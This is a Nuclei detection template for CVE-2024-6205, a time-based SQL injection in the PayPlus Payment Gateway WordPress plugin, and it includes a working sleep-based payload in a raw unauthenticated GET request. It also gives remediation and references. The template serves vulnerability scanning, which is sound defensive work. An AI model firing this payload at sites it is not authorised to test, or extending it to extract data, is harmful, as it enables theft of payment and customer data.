http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 302
    - regex('^-1$', body)
    - contains(content_type,"text/html")
    type: dsl
  raw:
  - '@timeout 20s

    GET /?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(6)))a)
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-6205
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-6205
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99558
    epss-score: 0.90108
  description: 'The PayPlus Payment Gateway WordPress plugin before 6.6.9 does not
    properly sanitise and escape a parameter before using it in a SQL statement via
    a WooCommerce API route available to unauthenticated users, leading to an SQL
    injection vulnerability.

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection through
    WooCommerce API routes to extract sensitive payment information, customer data,
    and database credentials.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: payplus-payment-gateway
    publicwww-query: /wp-content/plugins/payplus-payment-gateway
    vendor: payplus-ltd
  name: PayPlus Payment Gateway < 6.6.9 - SQL Injection
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/payplus-payment-gateway/payplus-payment-gateway-668-unauthenticated-sql-injection
  - https://wpscan.com/vulnerability/7e2c5032-2917-418c-aee3-092bdb78a087
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6205
  remediation: 'Update PayPlus Payment Gateway plugin to version 6.6.9 or later to
    address the SQL injection vulnerability.

    '
  severity: critical
  tags: time-based-sqli,wpscan,cve,cve2024,sqli,wordpress,wp-plugin,wp,payplus-payment,vkev,vuln
